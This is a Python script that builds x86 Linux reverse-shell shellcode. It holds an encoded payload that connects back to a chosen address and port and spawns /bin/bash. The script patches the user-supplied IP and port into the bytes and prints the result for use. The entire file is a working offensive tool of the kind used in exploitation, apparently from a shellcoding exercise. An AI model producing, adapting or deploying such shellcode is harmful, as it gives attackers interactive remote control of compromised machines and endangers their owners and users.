#!/usr/bin/python3

import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("address", help="IP address to connect to")
parser.add_argument("port", help="Port number to connect to")
args = parser.parse_args()

shellcode = b""
shellcode += b"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x50\x50\x68\x7f\x00\x00\x01\x66\x68\x1b\x59\x66\x6a\x02\x66\xb8\x6a\x01\x89\xfb\x89\xe1\x83\xc2\x10\xcd\x80\x31\xc0\x83\xc0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0";

res = format(int(args.port), '04x')
res1 = res[0:2]
res2 = res[2:]
newbytes = bytearray.fromhex(res1 + res2)

shellcode = shellcode.replace(b"\x1b\x59", newbytes)

# https://stackoverflow.com/questions/33244775/converting-ip-address-into-bytes-in-python
ip_as_bytes = bytes(map(int, args.address.split('.'))).hex()
byte1 = ip_as_bytes[0:1]
byte2 = ip_as_bytes[1:2]
byte3 = ip_as_bytes[2:3]
byte4 = ip_as_bytes[3:]
newbytes = bytearray.fromhex(byte1 + byte2 + byte3 + byte4)

shellcode = shellcode.replace(b"\x7f\x00\x00\x01", newbytes)

newstr = ""
i = 0
for char in shellcode.hex():
    if (i % 2 == 0):
        newstr += "\\x"
        newstr += char
    else:
        newstr += char
    i += 1
print("shellcode for reverse shell to {address}:{port}: ".format(address = args.address, port = args.port))
print(newstr)
